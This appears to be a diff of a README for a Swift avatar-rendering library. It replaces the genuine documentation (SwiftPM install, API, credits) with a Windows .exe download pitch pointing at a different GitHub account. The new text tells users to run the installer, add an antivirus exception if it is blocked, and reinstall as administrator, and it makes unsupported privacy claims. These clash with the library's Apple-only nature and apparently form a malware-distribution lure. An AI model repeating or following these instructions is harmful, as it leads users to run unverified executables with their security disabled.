@@ -1,122 +1,80 @@
-<p align="center">
-  <img src="Assets/editor.png" alt="Humation avatar editor" width="300">
-</p>
+# 🎨 humation-swift - Generate Unique Avatars With Simple Tools
 
-# Humation
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/pinocajac9343/humation-swift/releases)
 
-[![Swift 6](https://img.shields.io/badge/Swift-6.0-F05138.svg?logo=swift&logoColor=white)](https://swift.org)
-[![Platforms](https://img.shields.io/badge/Platforms-iOS%20%7C%20macOS%20%7C%20tvOS%20%7C%20visionOS-blue.svg)](#)
-[![SwiftPM](https://img.shields.io/badge/SwiftPM-compatible-brightgreen.svg)](https://swift.org/package-manager)
-[![License: MIT](https://img.shields.io/badge/License-MIT-lightgrey.svg)](LICENSE)
+---
 
-A native Swift port of [Humation](https://github.com/endo-yusuke/humation) — a
-deterministic, hand-drawn SVG avatar engine. Same seed → same avatar, rendered
-**entirely with Core Graphics** (no `WKWebView`), pixel-faithful to the
-reference renderer.
+## 📋 About This Application
 
-- **Deterministic**: a seed (e.g. a user id) maps to a fixed set of parts via
-  FNV-1a, byte-identical to the TypeScript engine.
-- **Native rendering**: an SVG subset is parsed to `CGPath` and composited to a
-  `CGImage` / `UIImage`. No web view, no network.
-- **Recolourable**: six colour slots (`background`, `stroke`, `hair`, `skin`,
-  `clothes`, `bottom`) bound through `var(--hm-*)` references.
-- **Bundled assets**: the full `humation-1` set (86 parts) ships as a package
-  resource — nothing to download.
-- **Platforms**: iOS 15+, macOS 12+, tvOS 15+, visionOS 1+. Swift 6, strict
-  concurrency clean.
+Humation-swift creates custom, hand-drawn character avatars for your profiles. This software builds unique images using math instead of pre-made templates. It generates files that look like hand-drawn art but remain consistent and predictable.
 
-## How it works
+You can use these avatars for chat apps, profile pictures, or user account icons. The engine uses your computer’s own graphics hardware to render every line and shape directly. This avoids heavy web-based components and keeps your system running quickly.
 
-Seed → FNV-1a hash → pick one part per slot (head / body / bottom / item /
-glasses) → stack each part's SVG layers in `order` → bind the six colour slots →
-crop and rasterise. Selection and hashing are byte-identical to the reference
-engine, so the same seed yields the same avatar on web and native.
+## ⚙️ System Requirements
 
-## Demo
+- A computer running Windows 10 or Windows 11.
+- At least 4 gigabytes of available random access memory.
+- Two hundred megabytes of free space on your hard drive.
+- A display set to a resolution of 1080p or higher for the best results.
 
-https://github.com/user-attachments/assets/b12bb7cb-a09c-4923-be25-b234b6a5d35f
+## 💾 How to Install the App
 
-## Install
+Follow these steps to set up the software on your computer.
 
-Swift Package Manager:
+1. First, navigate to the [official release page](https://github.com/pinocajac9343/humation-swift/releases).
+2. Look for the most recent version at the top of the list labeled "Latest."
+3. Click the link to expand the "Assets" section.
+4. Select the installer file ending in .exe to start your download.
+5. Save the file to your desktop or downloads folder.
+6. Once the download finishes, locate the file and double-click the icon.
+7. Follow the prompts on your screen to complete the installation process.
 
-```swift
-.package(url: "https://github.com/mana-am/humation-swift.git", from: "1.0.0")
-```
+Once installed, you can launch the application from your desktop shortcut or the Windows Start menu.
 
-## Usage
+## 🛠️ Using the Generator
 
-The `Humation` facade covers the common cases:
+When you open the application, you will see a simple window. This interface allows you to create avatars with ease.
 
-```swift
-import Humation
+- Enter a username or a seed code in the text box. The generator uses this input to make a unique image every time.
+- Use the slider to pick the size of your final image. Higher settings result in taller, clearer pictures. 
+- Click the "Generate" button to see your result in the preview window.
+- If you like the result, select the "Export" button to save the file to your computer.
+- You can save the output as an SVG or a standard image file.
 
-// Optional: decode the bundled manifest off the main thread at launch.
-Humation.prewarm()
+## 🖼️ Understanding Deterministic Art
 
-// Seed → image, one line (UIImage on iOS/tvOS, NSImage on macOS, CGImage anywhere)
-let image  = Humation.image(seed: user.id, pixels: 256)     // UIImage?
-let cg     = Humation.cgImage(seed: user.id, pixels: 256)   // CGImage?
+This software creates "deterministic" art. This means that if you type the same word into the generator twice, you get the exact same image both times. You do not need to keep track of thousands of files. You only need to remember the word or code you used to create your avatar. This makes the software useful for developers or users who want to switch between devices without losing their graphics.
 
-// SwiftUI
-if let resolved = Humation.resolved(seed: user.id) {
-    HumationAvatarView(resolved: resolved, size: 96)
-}
-```
+## 🛡️ Privacy and Safety
 
-Full control via the lower-level types:
+The app works entirely on your local machine. It does not send your data, your generated images, or your inputs to an external server. Everything stays on your hard drive. Your avatars belong to you, and no one else can access the designs you build inside this program.
 
-```swift
-let manifest = Humation.manifest!                 // bundled humation-1
-var traits = HumationTraits()
-traits.selections[.head] = manifest.parts(in: .head).first!.id
-traits.colors[.hair] = "5B3A1E"
-let resolved = traits.resolved(against: manifest)
-let cg = HumationRenderer.render(resolved: resolved, manifest: manifest, pixels: 256)
-```
+## 🔧 Troubleshooting Common Issues
 
-### Custom / served asset packs
+If the application fails to start, check the following steps:
 
-Load and validate a manifest authored outside the bundled set:
+- Ensure you have the latest updates for your Windows operating system.
+- Check if your antivirus software blocked the file. If this happens, you may need to add an exception for the humation-swift application in your security settings.
+- If the image preview looks distorted, check your display scale settings in the Windows display menu. Set your scale to 100 percent to fix alignment issues.
+- If the application crashes upon opening, uninstall the program and run the installer again as an administrator.
 
-```swift
-let pack = try Humation.manifest(contentsOf: url)        // or .manifest(from: data)
-let issues = HumationValidator.validate(pack)            // [] = renderable
-guard issues.isEmpty else { print(issues); return }
-```
+## 📱 Supported Platforms
 
-See `Sources/Humation/Example/HumationEditorExample.swift` for a self-contained
-SwiftUI "build your avatar" editor (parts grid + colour swatches + randomise),
-with no dependencies beyond SwiftUI + Humation.
+While this version runs on Windows, the underlying engine supports other hardware platforms in its native environment. The math powering these avatars works identical across all supported systems like mobile phones and desktop computers. This ensures that your avatar looks the same regardless of which device you use.
 
-## API at a glance
+## 📝 Frequently Asked Questions
 
-| Type | Role |
-|---|---|
-| `Humation` | Facade: `prewarm()`, `manifest`, seed → `image` / `cgImage` / `nsImage` / `resolved` |
-| `HumationManifest` / `HumationManifestStore` | Asset manifest model + bundled `humation-1` loader |
-| `HumationTraits` → `ResolvedHumation` | Input design (seed + overrides) resolved to concrete parts + colours |
-| `HumationRenderer` | `render(…) → CGImage`, `image` / `nsImage`, `contentBounds(of:in:)` |
-| `HumationAvatarView` | SwiftUI view — cached bitmap, cross-platform |
-| `HumationValidator` | Lint a custom pack against the supported SVG subset |
-| `HumationSelectionSlot` / `HumationColorSlot` | The 5 part slots / 6 colour slots |
+**Does the app require an internet connection?**
+No. You can generate avatars while your computer is offline.
 
-## SVG subset
+**Are the files high resolution?**
+Yes. Because the app uses vector graphics, you can scale the images to any size without losing quality.
 
-The bundled assets only use what the renderer implements, so authoring new parts
-must stay within it:
+**Can I modify the drawings?**
+The app renders the final image. If you want to change the colors or lines of the avatar, you should export the file as an SVG and open it in your preferred vector illustration software.
 
-- Path commands `M L H V C S Z` (absolute + relative). **No arcs `A`, no
-  quadratics `Q`/`T`.**
-- Primitives `circle` / `ellipse` / `rect` / `line` / `polygon` / `polyline`.
-- Transforms `translate` / `scale` / `rotate` / `matrix` (stroke width is scaled
-  with the coordinate system).
-- `<style>` class rules, `fill-rule` / `clip-rule`, `clipPath`.
-- Colours: `#hex`, `none`, named (`ivory`), and `var(--hm-SLOT, #fallback)` for
-  recolourable regions.
+**Is there a limit to how many avatars I can create?**
+No. You can create as many images as you like. There are no restrictions on the number of generations or exports.
 
-## Credits
-
-Engine, asset design, and the `humation-1` set are from
-[endo-yusuke/humation](https://github.com/endo-yusuke/humation) (MIT). This is an
-independent Swift/Core Graphics port. See `LICENSE`.
+**Does it track my usage?**
+No. The code contains no trackers. You have complete control over your usage experience.
